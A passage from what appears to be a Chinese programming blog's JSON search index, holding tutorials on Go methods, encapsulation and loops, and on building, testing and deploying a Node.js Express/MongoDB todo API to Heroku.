但通過Point.Distance得到的函數需要比實際的Distance方法多一個參數， // 卽其需要用第一個額外參數指定接收器，後面排列Distance方法的參數。 // 看起來本書中函數和方法的區别是指有沒有接收器，而不像其他語言那樣是指有沒有返迴值。 当你根据一个变量来决定调用同一个类型的哪个函数时，方法表达式就显得很有用了。你可以根据选择来调用接收器各不相同的方法。下面的例子，变量op代表Point类型的addition或者subtraction方法，Path.TranslateBy方法会为其Path数组中的每一个Point来调用对应的方法： 12345678910111213141516171819type Point struct&#123; X, Y float64 &#125;func (p Point) Add(q Point) Point &#123; return Point&#123;p.X + q.X, p.Y + q.Y&#125; &#125;func (p Point) Sub(q Point) Point &#123; return Point&#123;p.X - q.X, p.Y - q.Y&#125; &#125;type Path []Pointfunc (path Path) TranslateBy(offset Point, add bool) &#123; var op func(p, q Point) Point if add &#123; op = Point.Add &#125; else &#123; op = Point.Sub &#125; for i := range path &#123; // Call either path[i].Add(offset) or path[i].Sub(offset). path[i] = op(path[i], offset) &#125;&#125; 封装 一个对象的变量或者方法如果对调用方是不可见的话，一般就被定义为“封装”。封装有时候也被叫做信息隐藏，同时也是面向对象编程最关键的一个方面。 Go语言只有一种控制可见性的手段：大写首字母的标识符会从定义它们的包中被导出，小写字母的则不会。这种限制包内成员的方式同样适用于struct或者一个类型的方法。因而如果我们想要封装一个对象，我们必须将其定义为一个struct。 这也就是前面的小节中IntSet被定义为struct类型的原因，尽管它只有一个字段： type IntSet struct { words []uint64 } 当然，我们也可以把IntSet定义为一个slice类型，尽管这样我们就需要把代码中所有方法里用到的s.words用s替换掉了： type IntSet []uint64 尽管这个版本的IntSet在本质上是一样的，他也可以允许其它包中可以直接读取并编辑这个slice。换句话说，相对s这个表达式会出现在所有的包中，s.words只需要在定义IntSet的包中出现(译注：所以还是推荐后者吧的意思)。 这种基于名字的手段使得在语言中最小的封装单元是package，而不是像其它语言一样的类型。一个struct类型的字段对同一个包的所有代码都有可见性，无论你的代码是写在一个函数还是一个方法里。 封装提供了三方面的优点。首先，因为调用方不能直接修改对象的变量值，其只需要关注少量的语句并且只要弄懂少量变量的可能的值卽可。 第二，隐藏实现的细节，可以防止调用方依赖那些可能变化的具体实现，这样使设计包的程序员在不破坏对外的api情况下能得到更大的自由。 把bytes.Buffer这个类型作为例子来考虑。这个类型在做短字符串叠加的时候很常用，所以在设计的时候可以做一些预先的优化，比如提前预留一部分空间，来避免反复的内存分配。又因为Buffer是一个struct类型，这些额外的空间可以用附加的字节数组来保存，且放在一个小写字母开头的字段中。这样在外部的调用方只能看到性能的提升，但并不会得到这个附加变量。Buffer和其增长算法我们列在这里，为了简洁性稍微做了一些精简： 123456789101112131415161718type Buffer struct &#123; buf []byte initial [64]byte /* ... */&#125;// Grow expands the buffer&apos;s capacity, if necessary,// to guarantee space for another n bytes. [...]func (b *Buffer) Grow(n int) &#123; if b.buf == nil &#123; b.buf = b.initial[:0] // use preallocated space initially &#125; if len(b.buf)+n &gt; cap(b.buf) &#123; buf := make([]byte, b.Len(), 2*cap(b.buf) + n) copy(buf, b.buf) b.buf = buf &#125;&#125; 封装的第三个优点也是最重要的优点，是阻止了外部调用方对对象内部的值任意地进行修改。因为对象内部变量只可以被同一个包内的函数修改，所以包的作者可以让这些函数确保对象内部的一些值的不变性。比如下面的Counter类型允许调用方来增加counter变量的值，并且允许将这个值reset为0，但是不允许随便设置这个值(译注：因为压根就访问不到)： 1234type Counter struct &#123; n int &#125;func (c *Counter) N() int &#123; return c.n &#125;func (c *Counter) Increment() &#123; c.n++ &#125;func (c *Counter) Reset() &#123; c.n = 0 &#125; 只用来访问或修改内部变量的函数被称为setter或者getter，例子如下，比如log包里的Logger类型对应的一些函数。在命名一个getter方法时，我们通常会省略掉前面的Get前缀。这种简洁上的偏好也可以推广到各种类型的前缀比如Fetch，Find或者Lookup。 12345678910package logtype Logger struct &#123; flags int prefix string // ...&#125;func (l *Logger) Flags() intfunc (l *Logger) SetFlags(flag int)func (l *Logger) Prefix() stringfunc (l *Logger) SetPrefix(prefix string) Go的编码风格不禁止直接导出字段。当然，一旦进行了导出，就没有办法在保证API兼容的情况下去除对其的导出，所以在一开始的选择一定要经过深思熟虑并且要考虑到包内部的一些不变量的保证，未来可能的变化，以及调用方的代码质量是否会因为包的一点修改而变差。 封装并不总是理想的。虽然封装在有些情况是必要的，但有时候我们也需要暴露一些内部内容，比如：time.Duration将其表现暴露为一个int64数字的纳秒，使得我们可以用一般的数值操作来对时间进行对比，甚至可以定义这种类型的常量： 12const day = 24 * time.Hourfmt.Println(day.Seconds()) // &quot;86400&quot;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[9]-doubleloop","slug":"golang-9-doubleloop","date":"2018-11-18T13:43:45.000Z","updated":"2018-11-20T02:43:37.442Z","comments":true,"path":"2018/11/18/golang-9-doubleloop/","link":"","permalink":"https://dreamerjonson.com/2018/11/18/golang-9-doubleloop/","excerpt":"","text":"循环嵌套 一般形式 12345678910111213package mainimport \"fmt\"func main()&#123; var sum int for i:=0;i&lt;5;i++&#123; for j:=0;j&lt;3;j++&#123; sum = i*j &#125; &#125; fmt.Println(sum)&#125; 双for循环案例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112package mainimport ( \"fmt\")var lines = 9func main() &#123; // 打印矩形 printRectangle() //打印左下直角三角形 printRightTriangleLB() //打印左上直角三角形 printRightTriangleLT() // 打印右下直角三角形 printRightTriangleRB() // 打印右上直角三角形 printRightTriangleRT() // 打印等腰三角形 printEqualTriangle() // 打印九九乘法表 multiple99()&#125;//1、打印矩形func printRectangle() &#123; fmt.Println(\"\\n打印矩形\") for i := 1; i &lt;= lines; i++ &#123; for j := 1; j &lt;= lines; j++ &#123; fmt.Print(\"❤ \") &#125; fmt.Println() &#125;&#125;//2、打印左下直角三角形func printRightTriangleLB() &#123; fmt.Println(\"\\n打印左下直角三角形\") for i := 1; i &lt;= lines; i++ &#123; for j := 1; j &lt;= i; j++ &#123; fmt.Print(\"❤ \") &#125; fmt.Println() &#125;&#125;//3、打印左上直角三角形func printRightTriangleLT() &#123; fmt.Println(\"\\n打印左上直角三角形\") for i := 1; i &lt;= lines; i++ &#123; for j := lines; j &gt;= i; j-- &#123; fmt.Print(\"❤ \") &#125; fmt.Println() &#125;&#125;//4、打印右下直角三角形func printRightTriangleRB() &#123; fmt.Println(\"\\n打印右下直角三角形\") for i := 1; i &lt;= lines; i++ &#123; //打印空格 for m := lines; m &gt;= i; m-- &#123; fmt.Print(\" \") &#125; //打印三角形 for j := 1; j &lt;= i; j++ &#123; fmt.Print(\"❤ \") &#125; fmt.Println() &#125;&#125;//5、打印右上直角三角形func printRightTriangleRT() &#123; fmt.Println(\"\\n打印右上直角三角形\") for i := 1; i &lt;= lines; i++ &#123; //打印空格 for m := 1; m &lt;= i; m++ &#123; fmt.Print(\" \") &#125; //打印三角形 for j := lines; j &gt;= i; j-- &#123; fmt.Print(\"❤ \") &#125; fmt.Println() &#125;&#125;//6、打印等腰三角形func printEqualTriangle() &#123; fmt.Println(\"\\n打印等腰三角形\") for i := 1; i &lt;= lines; i++ &#123; //打印空格 for m := lines; m &gt;= i; m-- &#123; fmt.Print(\" \") &#125; // 打印三角形 for j := 1; j &lt;= 2*i-1; j++ &#123; fmt.Print(\"❤ \") &#125; fmt.Println() &#125;&#125; 输出结果为 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576打印矩形❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤打印左下直角三角形❤❤ ❤❤ ❤ ❤❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤打印左上直角三角形❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤ ❤❤ ❤ ❤ ❤❤ ❤ ❤❤ ❤❤打印右下直角三角形 ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤打印右上直角三角形 ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤打印等腰三角形 ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤ ❤打印九九乘法表1*1= 11*2= 2 2*2= 41*3= 3 2*3= 6 3*3= 91*4= 4 2*4= 8 3*4=12 4*4=161*5= 5 2*5=10 3*5=15 4*5=20 5*5=251*6= 6 2*6=12 3*6=18 4*6=24 5*6=30 6*6=361*7= 7 2*7=14 3*7=21 4*7=28 5*7=35 6*7=42 7*7=491*8= 8 2*8=16 3*8=24 4*8=32 5*8=40 6*8=48 7*8=56 8*8=641*9= 9 2*9=18 3*9=27 4*9=36 5*9=45 6*9=54 7*9=63 8*9=72 9*9=81","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"nodejs渐入佳境[21]-express+mondoDB应用部署到heroku","slug":"node-21-deploy-heroku","date":"2018-11-18T12:37:35.000Z","updated":"2018-11-29T03:14:40.180Z","comments":true,"path":"2018/11/18/node-21-deploy-heroku/","link":"","permalink":"https://dreamerjonson.com/2018/11/18/node-21-deploy-heroku/","excerpt":"","text":"express+mongoDB部署到heroku 注意process.env.PORT 与 process.env.MONGODB_URI 源代码postman.js： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091var mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;&#125;);//express routeapp.post('/todos',(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', (req, res) =&gt; &#123; Todo.find().then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findById(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125; package.json package.json配置文件中指定start脚本与node的版本 12345678&quot;scripts&quot;: &#123; &quot;test&quot;: &quot;mocha&quot;, &quot;test-watch&quot;:&quot;nodemon --exec &apos;npm test&apos;&quot;, &quot;start&quot;: &quot;node postman.js&quot;&#125;,&quot;engines&quot;:&#123; &quot;node&quot;: &quot;10.13.0&quot;&#125;, heroku部署 123456heroku createheroku addons:create mongolab:sandbox //添加mongodb到 herokuheroku config //查看git add .git commit -m &quot;commit&quot;git push heroxu master 测试 12访问 domain/todos配合postman增加document","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[20]-postman测试express+mogoDB项目","slug":"node-20-postman","date":"2018-11-18T04:07:21.000Z","updated":"2018-11-29T03:13:59.357Z","comments":true,"path":"2018/11/18/node-20-postman/","link":"","permalink":"https://dreamerjonson.com/2018/11/18/node-20-postman/","excerpt":"","text":"安装postman 网址：https://www.getpostman.com 网址访问,保存数据 postman.js: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758var mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');//appvar app = express();//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect('mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;&#125;);//express routeapp.post('/todos',(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//监听app.listen(3000,()=&gt;&#123; console.log('Start on port 3000');&#125;);module.exports = &#123; app, Todo&#125; 测试 安装expect nodemon supertest mocha //test/postman.test.js: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253const &#123;app,Todo&#125; = require('../postman')const expect = require('expect')const request = require('supertest')beforeEach((done) =&gt; &#123; Todo.remove(&#123;&#125;).then(() =&gt; done());&#125;);describe('POST /todos', () =&gt; &#123; it('should create a new todo', (done) =&gt; &#123; var text = 'Test todo text'; request(app) .post('/todos') .send(&#123;text&#125;) .expect(200) .expect((res) =&gt; &#123; expect(res.body.text).toBe(text); &#125;) .end((err, res) =&gt; &#123; if (err) &#123; return done(err); &#125; Todo.find().then((todos) =&gt; &#123; expect(todos.length).toBe(1); expect(todos[0].text).toBe(text); done(); &#125;).catch((e) =&gt; done(e)); &#125;); &#125;); it('should not create todo with invalid body data', (done) =&gt; &#123; request(app) .post('/todos') .send(&#123;&#125;) .expect(400) .end((err, res) =&gt; &#123; if (err) &#123; return done(err); &#125; Todo.find().then((todos) =&gt; &#123; expect(todos.length).toBe(0); done(); &#125;).catch((e) =&gt; done(e)); &#125;); &#125;);&#125;); 修改package.json 1234&quot;scripts&quot;: &#123; &quot;test&quot;: &quot;mocha&quot;, &quot;test-watch&quot;:&quot;nodemon --exec &apos;npm test&apos;&quot;,&#125; 运行 1&gt;npm run test-watch 获取所有document 1234567app.get(&apos;/todos&apos;, (req, res) =&gt; &#123; Todo.find().then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;); 测试2 //test/postman.test.js: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273const &#123;app,Todo&#125; = require('../postman')const expect = require('expect')const request = require('supertest')const todos = [&#123; text: 'First test todo'&#125;, &#123; text: 'Second test todo'&#125;];beforeEach((done) =&gt; &#123; Todo.remove(&#123;&#125;).then(() =&gt; &#123;// 删除后插入对象 return Todo.insertMany(todos); &#125;).then(() =&gt; done());&#125;);describe('POST /todos', () =&gt; &#123; it('should create a new todo', (done) =&gt; &#123; var text = 'Test todo text'; request(app) .post('/todos') .send(&#123;text&#125;) .expect(200) .expect((res) =&gt; &#123; expect(res.body.text).toBe(text); &#125;) .end((err, res) =&gt; &#123; if (err) &#123; return done(err); &#125; Todo.find(&#123;text&#125;).then((todos) =&gt; &#123; expect(todos.length).toBe(1); expect(todos[0].text).toBe(text); done(); &#125;).catch((e) =&gt; done(e)); &#125;); &#125;); it('should not create todo with invalid body data', (done) =&gt; &#123; request(app) .post('/todos') .send(&#123;&#125;) .expect(400) .end((err, res) =&gt; &#123; if (err) &#123; return done(err); &#125; Todo.find().then((todos) =&gt; &#123; expect(todos.length).toBe(2); done(); &#125;).catch((e) =&gt; done(e)); &#125;); &#125;);&#125;);describe('GET /todos', () =&gt; &#123; it('should get all todos', (done) =&gt; &#123; request(app) .get('/todos') .expect(200) .expect((res) =&gt; &#123; expect(res.body.todos.length).toBe(2); &#125;) .end(done); &#125;);&#125;); 查询id 123456789101112131415161718//查询idapp.get('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findById(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;); 测试3： //test/postman.test.js: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102const &#123;app,Todo&#125; = require('../postman')const &#123;ObjectID&#125; = require('mongodb');const expect = require('expect')const request = require('supertest')const todos = [&#123; _id: new ObjectID(), text: 'First test todo'&#125;, &#123; _id: new ObjectID(), text: 'Second test todo'&#125;];beforeEach((done) =&gt; &#123; Todo.remove(&#123;&#125;).then(() =&gt; &#123; return Todo.insertMany(todos); &#125;).then(() =&gt; done());&#125;);describe('POST /todos', () =&gt; &#123; it('should create a new todo', (done) =&gt; &#123; var text = 'Test todo text'; request(app) .post('/todos') .send(&#123;text&#125;) .expect(200) .expect((res) =&gt; &#123; expect(res.body.text).toBe(text); &#125;) .end((err, res) =&gt; &#123; if (err) &#123; return done(err); &#125; Todo.find(&#123;text&#125;).then((todos) =&gt; &#123; expect(todos.length).toBe(1); expect(todos[0].text).toBe(text); done(); &#125;).catch((e) =&gt; done(e)); &#125;); &#125;); it('should not create todo with invalid body data', (done) =&gt; &#123; request(app) .post('/todos') .send(&#123;&#125;) .expect(400) .end((err, res) =&gt; &#123; if (err) &#123; return done(err); &#125; Todo.find().then((todos) =&gt; &#123; expect(todos.length).toBe(2); done(); &#125;).catch((e) =&gt; done(e)); &#125;); &#125;);&#125;);describe('GET /todos', () =&gt; &#123; it('should get all todos', (done) =&gt; &#123; request(app) .get('/todos') .expect(200) .expect((res) =&gt; &#123; expect(res.body.todos.length).toBe(2); &#125;) .end(done); &#125;);&#125;);describe('GET /todos/:id', () =&gt; &#123; it('should return todo doc', (done) =&gt; &#123; request(app) .get(`/todos/$&#123;todos[0]._id.toHexString()&#125;`) .expect(200) .expect((res) =&gt; &#123; expect(res.body.todo.text).toBe(todos[0].text); &#125;) .end(done); &#125;); it('should return 404 if todo not found', (done) =&gt; &#123; var hexId = new ObjectID().toHexString(); request(app) .get(`/todos/$&#123;hexId&#125;`) .expect(404) .end(done); &#125;); it('should return 404 for non-object ids', (done) =&gt; &#123; request(app) .get('/todos/123abc') .expect(404) .end(done); &#125;);&#125;); 删除id 123456789101112131415161718//删除app.delete('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findByIdAndRemove(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;); 测试4 //test/postman.test.js: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140const &#123;app,Todo&#125; = require('../postman')const &#123;ObjectID&#125; = require('mongodb');const expect = require('expect')const request = require('supertest')const todos = [&#123; _id: new ObjectID(), text: 'First test todo'&#125;, &#123; _id: new ObjectID(), text: 'Second test todo'&#125;];beforeEach((done) =&gt; &#123; Todo.remove(&#123;&#125;).then(() =&gt; &#123; return Todo.insertMany(todos); &#125;).then(() =&gt; done());&#125;);describe('POST /todos', () =&gt; &#123; it('should create a new todo', (done) =&gt; &#123; var text = 'Test todo text'; request(app) .post('/todos') .send(&#123;text&#125;) .expect(200) .expect((res) =&gt; &#123; expect(res.body.text).toBe(text); &#125;) .end((err, res) =&gt; &#123; if (err) &#123; return done(err); &#125; Todo.find(&#123;text&#125;).then((todos) =&gt; &#123; expect(todos.length).toBe(1); expect(todos[0].text).toBe(text); done(); &#125;).catch((e) =&gt; done(e)); &#125;); &#125;); it('should not create todo with invalid body data', (done) =&gt; &#123; request(app) .post('/todos') .send(&#123;&#125;) .expect(400) .end((err, res) =&gt; &#123; if (err) &#123; return done(err); &#125; Todo.find().then((todos) =&gt; &#123; expect(todos.length).toBe(2); done(); &#125;).catch((e) =&gt; done(e)); &#125;); &#125;);&#125;);describe('GET /todos', () =&gt; &#123; it('should get all todos', (done) =&gt; &#123; request(app) .get('/todos') .expect(200) .expect((res) =&gt; &#123; expect(res.body.todos.length).toBe(2); &#125;) .end(done); &#125;);&#125;);describe('GET /todos/:id', () =&gt; &#123; it('should return todo doc', (done) =&gt; &#123; request(app) .get(`/todos/$&#123;todos[0]._id.toHexString()&#125;`) .expect(200) .expect((res) =&gt; &#123; expect(res.body.todo.text).toBe(todos[0].text); &#125;) .end(done); &#125;); it('should return 404 if todo not found', (done) =&gt; &#123; var hexId = new ObjectID().toHexString(); request(app) .get(`/todos/$&#123;hexId&#125;`) .expect(404) .end(done); &#125;); it('should return 404 for non-object ids', (done) =&gt; &#123; request(app) .get('/todos/123abc') .expect(404) .end(done); &#125;);&#125;);describe('DELETE /todos/:id', () =&gt; &#123; it('should remove a todo', (done) =&gt; &#123; var hexId = todos[1]._id.toHexString(); request(app) .delete(`/todos/$&#123;hexId&#125;`) .expect(200) .expect((res) =&gt; &#123; expect(res.body.todo._id).toBe(hexId); &#125;) .end((err, res) =&gt; &#123; if (err) &#123; return done(err); &#125; Todo.findById(hexId).then((todo) =&gt; &#123; expect(todo).toBeFalsy(); done(); &#125;).catch((e) =&gt; done(e)); &#125;); &#125;); it('should return 404 if todo not found', (done) =&gt; &#123; var hexId = new ObjectID().toHexString(); request(app) .delete(`/todos/$&#123;hexId&#125;`) .expect(404) .end(done); &#125;); it('should return 404 if object id is invalid', (done) =&gt; &#123; request(app) .delete('/todos/123abc') .expect(404) .end(done); &#125;);&#125;); 更新 1&gt; npm install --save lodash 1234567891011121314151617181920212223242526//更新app.patch('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findByIdAndUpdate(id, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;); 测试5 //test/postman.test.js: 123456789101112131415161718192021222324252627282930313233343536373839describe('PATCH /todos/:id', () =&gt; &#123; it('should update the todo', (done) =&gt; &#123; var hexId = todos[0]._id.toHexString(); var text = 'This should be the new text'; request(app) .patch(`/todos/$&#123;hexId&#125;`) .send(&#123; completed: true, text &#125;) .expect(200) .expect((res) =&gt; &#123; expect(res.body.todo.text).toBe(text); expect(res.body.todo.completed).toBe(true); expect(typeof res.body.todo.completedAt).toBe('number'); &#125;) .end(done); &#125;); it('should clear completedAt when todo is not completed', (done) =&gt; &#123; var hexId = todos[1]._id.toHexString(); var text = 'This should be the new text!!'; request(app) .patch(`/todos/$&#123;hexId&#125;`) .send(&#123; completed: false, text &#125;) .expect(200) .expect((res) =&gt; &#123; expect(res.body.todo.text).toBe(text); expect(res.body.todo.completed).toBe(false); expect(res.body.todo.completedAt).toBeFalsy(); &#125;) .end(done); &#125;);&#125;);","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"node[19]-mongoose操作mongoDB数据库","slug":"node-19-mongoose","date":"2018-11-18T03:10:41.000Z","updated":"2018-11-29T03:12:51.445Z","comments":true,"path":"2018/11/18/node-19-mongoose/","link":"","permalink":"https://dreamerjonson.com/2018/11/18/node-19-mongoose/","excerpt":"","text":"mongoose 1234567891011121314151617181920212223242526272829var mongoose = require('mongoose');mongoose.Promise = global.Promise;mongoose.connect('mongodb://localhost:27017/TodoApp');//建立模型var Todo = mongoose.model('Todo',&#123; text:&#123; type:String &#125;, completed:&#123; type:Boolean &#125;, completedAt:&#123; type:Number &#125;&#125;);//存储var newTodo = new Todo(&#123; text:'Cook dinner'&#125;);newTodo.save().then((doc)=&gt;&#123; console.log('Save todo',doc);&#125;,(e)=&gt;&#123; console.log('Unable to save todo');&#125;); mongoose validators 下面的程序失败，因为text去空格后的值的长度小于1: 12345678910111213141516171819202122232425262728293031323334var mongoose = require('mongoose');mongoose.Promise = global.Promise;mongoose.connect('mongodb://localhost:27017/TodoApp');var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;&#125;);//失败，因为text去空格后的值的长度小于1。var newTodo = new Todo(&#123; text:' ',&#125;);newTodo.save().then((doc)=&gt;&#123; console.log('Save todo',doc);&#125;,(e)=&gt;&#123; console.log('Unable to save todo');&#125;);","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"go语言渐入佳境[8]-loop","slug":"golang-8-loop","date":"2018-11-17T14:41:46.000Z","updated":"2018-11-20T02:16:49.288Z","comments":true,"path":"2018/11/17/golang-8-loop/","link":"","permalink":"https://dreamerjonson.com/2018/11/17/golang-8-loop/","excerpt":"","text":"123456789101112package mainimport ( &quot;fmt&quot;)func main()&#123; //调用 loop1() sum2()&#125; 第1种形式 12345678func loop1()&#123; //形式1 for i:=0;i&lt;10;i++&#123; fmt.Println(i) &#125;&#125; 第2种形式 12345678func loop2()&#123; //形式二 i:=0 for ;i&lt;10;i++&#123; fmt.Println(i) &#125;&#125; 第3种形式 1234567891011func loop3()&#123; //第三种形式 i:=0 for ;;i++&#123; if(i&gt;20)&#123; break &#125; fmt.Println(i) &#125;&#125; 第4种形式 1234567891011func loop4()&#123; //第四种形式 i:=0 for ; ; &#123; if i&gt;20&#123; break &#125; i++ fmt.Println(i) &#125;&#125; 第5种形式 12345678func loop5()&#123; i:=0 for i&lt;20&#123; i++ fmt.Println(i) &#125;&#125; 第6种形式 12345678910111213func loop6()&#123; i:=0 for&#123; if i &lt;20&#123; i++ fmt.Println(i) &#125;else&#123; break &#125; &#125;&#125; 简单案例：计算1-100之间的和： 1234567891011func sum()&#123; result:=0 for i:=0;i&lt;=100;i++&#123; fmt.Printf(\"result:%d i:%d\\n\",result,i) result +=i &#125; fmt.Println(result)&#125; 简单案例：计算1 - 100之间所有的奇数的和 12345678910func sum2()&#123; result:=0 for i:=0;i&lt;=100;i++&#123; if(i %2 ==0)&#123; result +=i &#125; &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[7]-if判断条件","slug":"golang-7-if","date":"2018-11-17T12:40:12.000Z","updated":"2018-11-20T02:16:56.185Z","comments":true,"path":"2018/11/17/golang-7-if/","link":"","permalink":"https://dreamerjonson.com/2018/11/17/golang-7-if/","excerpt":"","text":"if条件语句的表现形式： 